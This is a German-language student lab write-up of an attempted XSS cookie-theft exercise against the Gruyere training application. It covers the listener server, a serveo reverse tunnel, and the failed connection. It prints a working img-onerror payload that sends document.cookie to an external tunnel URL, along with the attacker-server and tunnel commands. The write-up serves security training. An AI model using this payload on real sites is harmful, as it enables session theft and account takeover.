# Dokumentation: Cookie-Theft via XSS (Gruyere-Lab, B2/B3)
 
## Durchgeführte Schritte
 
### 1. Security Group konfiguriert
Port 9000 wurde in der Security Group `m183-sg` für "My IP" als Inbound-Regel freigegeben (Custom TCP, Port 9000).
 
### 2. Angreifer-Server gestartet
Auf der EC2-Instanz wurde via SSH ein Python-HTTP-Server gestartet:
 
```
python3 -m http.server 9000
```
 
→ Funktionierte korrekt. Lokaler Test direkt auf der Instanz (`curl http://localhost:9000/?c=test`) lieferte eine erfolgreiche Antwort (Directory-Listing), d.h. der Server selbst lief einwandfrei und protokollierte Anfragen wie erwartet.
 
### 3. Serveo-Tunnel gestartet
In einem zweiten SSH-Terminal wurde der Reverse-Tunnel aufgebaut:
 
```
ssh -R 80:localhost:9000 serveo.net
```
 
→ Es wurde eine HTTPS-URL zugewiesen:
`https://708f614964d5f322-54-166-163-68.serveousercontent.com`
 
### 4. Payload in Gruyere platziert
 
```html
<img src="x" onerror="new Image().src='https://708f614964d5f322-54-166-163-68.serveousercontent.com/?c='+encodeURIComponent(document.cookie)">
```
 
Das JavaScript wurde auf Syntaxfehler überprüft und war korrekt.
 
### 5. Cookie-Diebstahl getestet
Beim Laden der Gruyere-Seite im Verteidiger-Fenster wurde **kein** Log-Eintrag im Python-Server-Terminal sichtbar.
 
## Was nicht funktioniert hat – Fehleranalyse
 
Schrittweise Eingrenzung des Problems:
 
| Test | Ergebnis |
|---|---|
| Lokal auf EC2: `curl http://localhost:9000/?c=test` | ✅ Erfolgreich – Server antwortet korrekt |
| Browser-Zugriff auf Serveo-URL | ❌ `ERR_CONNECTION_RESET` |
| Windows-PC: `curl -v https://<serveo-url>/?c=test` | ❌ TLS-Handshake schlägt fehl: `Recv failure: Connection was reset`, `schannel: failed to receive handshake` |
 
**Diagnose:** Der Python-Server auf EC2 funktionierte nachweislich korrekt (lokaler Test erfolgreich). Das Problem lag beim **Serveo-Tunnel selbst** – die Verbindung scheiterte bereits auf TLS-Ebene, also bevor überhaupt eine HTTP-Anfrage den Server erreichen konnte. Die Verbindung wurde vom Server (oder einem Netzwerkknoten dazwischen) während des SSL/TLS-Handshakes aktiv zurückgesetzt.
 
**Mögliche Ursachen:**
 
- Serveo.net ist ein kostenloser, inoffizieller Drittanbieter-Dienst ohne Verfügbarkeitsgarantie (kein SLA); die zugewiesene Subdomain-Form (`<hash>-<ip-mit-bindestrichen>.serveousercontent.com`) erwies sich als instabil.
- Möglich, dass der Reverse-SSH-Tunnel zwischenzeitlich (z.B. durch Inaktivität) unterbrochen wurde, ohne dass dies im Terminal sofort sichtbar war.
- Eine Netzwerk-/Firewall-Beeinträchtigung auf Client-Seite konnte nicht vollständig ausgeschlossen werden, war aber aufgrund des serverseitigen Verhaltens (Reset während TLS-Handshake, nicht beim TCP-Connect) weniger wahrscheinlich.
**Konsequenz:** Da der HTTPS-Tunnel zum Zeitpunkt der Durchführung nicht stabil erreichbar war, konnte der Cookie-Diebstahl nicht erfolgreich abgeschlossen werden – der Payload selbst (HTML/JS) war korrekt, der Angriff scheiterte an der Infrastruktur, nicht an der XSS-Schwachstelle oder der Exfiltrationslogik.
